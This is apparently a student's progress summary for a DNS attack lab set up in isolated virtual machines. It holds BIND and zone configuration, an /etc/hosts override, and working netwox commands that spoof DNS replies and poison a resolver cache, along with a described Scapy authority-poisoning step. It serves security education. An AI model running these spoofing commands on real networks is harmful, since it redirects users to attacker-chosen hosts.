# Lab 1: Local DNS Attack - Progress Summary

**Date**: February 17, 2026  
**Status**: Tasks 1-7 Complete

---

## Network Setup (FINAL WORKING CONFIG)

**Host-Only Network**: vboxnet0 (192.168.56.0/24)

| VM | IP | Role |
|---|---|---|
| User | 192.168.56.101 | DNS client |
| DNS Server | 192.168.56.104 | BIND 9 server |
| Attacker | 192.168.56.105 | Attack originator |

**VirtualBox Settings (All VMs)**:
- Adapter 1: Host-Only Adapter (vboxnet0)
- Promiscuous Mode: Allow All
- Adapter 2: NAT (for Internet)
- Cable connected: On

---

## Completed Tasks

### Task 1: User VM Configuration ✅
**Command**:
```bash
sudo sh -c 'printf "nameserver 192.168.56.104\n" > /etc/resolvconf/resolv.conf.d/head'
sudo resolvconf -u
```
**Verification**:
```bash
dig @192.168.56.104 www.google.com
# Should show: SERVER: 192.168.56.104#53
```

### Task 2: BIND DNS Server Setup ✅
**File**: `/etc/bind/named.conf.options`
```conf
options {
	dump-file "/var/cache/bind/dump.db";
	# dnssec-validation auto;
	dnssec-enable no;
	directory "/var/cache/bind";
};
```
**Commands**:
```bash
sudo service bind9 restart
sudo rndc dumpdb -cache      # Dump cache
sudo rndc flush               # Flush cache
```

### Task 3: Host example.com Zone ✅
**Forward Zone File**: `/etc/bind/example.com.db`
```conf
$TTL 3D
@   IN  SOA ns.example.com. admin.example.com. (1 8H 2H 4W 1D)
@   IN  NS  ns.example.com.
www IN  A   192.168.56.101
mail IN A   192.168.56.102
ns  IN  A   192.168.56.104
```

**Reverse Zone File**: `/etc/bind/192.168.56.db`
```conf
$TTL 3D
@   IN  SOA ns.example.com. admin.example.com. (1 8H 2H 4W 1D)
@   IN  NS  ns.example.com.
101 IN  PTR www.example.com.
102 IN  PTR mail.example.com.
104 IN  PTR ns.example.com.
```

**Verification**:
```bash
dig @192.168.56.104 www.example.com
# Shows: www.example.com. 259200 IN A 192.168.56.101
dig @192.168.56.104 -x 192.168.56.101
# Shows: 101.56.168.192.in-addr.arpa. 259200 IN PTR www.example.com.
```

### Task 4: /etc/hosts Modification ✅
**Before**:
```bash
ping -c 2 www.bank32.com    # Returns real IP
dig www.bank32.com          # Returns real DNS
```

**Edit**:
```bash
sudo nano /etc/hosts
# Add: 1.2.3.4 www.bank32.com
```

**After**:
```bash
ping -c 2 www.bank32.com    # Resolves to 1.2.3.4
dig www.bank32.com          # Still returns real DNS (dig ignores /etc/hosts)
```

### Task 5: Direct DNS Spoofing to User ✅
**Attacker VM Command** (on enp0s3):
```bash
sudo netwox 105 -h "www.example.net" -H 1.2.3.4 -a "ns.example.net" \
  -A 192.168.56.104 -d enp0s3 -T 600 \
  -f "udp and src host 192.168.56.101 and dst host 192.168.56.104 and dst port 53" \
  -s raw
```

**User VM Query**:
```bash
dig www.example.net
# Shows: www.example.net. IN A 1.2.3.4
```

**Result**: ✅ Spoof successful (with Promiscuous Mode: Allow All)

### Task 6: DNS Cache Poisoning ✅
**Attacker VM Command (NAT network on enp0s8):**
```bash
sudo netwox 105 -h "p4g77.example.net" -H 1.2.3.4 -a "ns.example.net" \
	-A 192.168.56.104 -d enp0s8 -T 600 \
	-f "udp and src host 10.10.0.9 and dst port 53" -s raw
```

**User VM Query:**
```bash
dig p4g77.example.net
# Shows: p4g77.example.net. IN A 1.2.3.4
```

**Result**: ✅ Poisoned cache for a fresh subdomain

---

### Task 7: Authority-Section Poisoning (Scapy) ✅
**Script**: `/home/seed/poison_auth.py` (Python 3.5 compatible; no f-strings)

**User VM Query:**
```bash
dig z9k11.example.net
# Shows: z9k11.example.net. IN A 1.2.3.4
# AUTHORITY: example.net. IN NS attacker.local.
```

**DNS Server Cache Check:**
```bash
sudo rndc dumpdb -cache
sudo cat /var/cache/bind/dump.db | grep -A 3 "example.net.*NS"
# Shows: example.net. NS attacker.local.
```

**Result**: ✅ Authority section poisoned

---

## Key Lessons Learned

1. **Promiscuous Mode Critical**: Host-Only networks require `Allow All` to sniff host-only traffic
2. **Two-Adapter Setup Required**: NAT (Adapter 2) for outbound/Internet, Host-Only (Adapter 1) for VM-to-VM
3. **Task 5 Works Well**: Direct user spoofing is reliable; server is the harder target
4. **DNSSEC Must Be Off**: `dnssec-enable no;` and comment out `dnssec-validation auto;`
5. **Cache Timing**: Fresh queries needed to force DNS server to ask external servers

---

## Screenshots Captured (for report)

- [x] Task 1: User VM using local DNS (SERVER: 192.168.56.104#53)
- [x] Task 2: BIND running and caching
- [x] Task 3: Forward + Reverse lookups working
- [x] Task 4: /etc/hosts override
- [x] Task 5: Direct spoof (1.2.3.4 in answer)
- [x] Task 6: Poisoned subdomain answer (1.2.3.4)
- [x] Task 7: Authority section pointing to attacker.local

---

**Next Session**: Wrap report and compile screenshots.
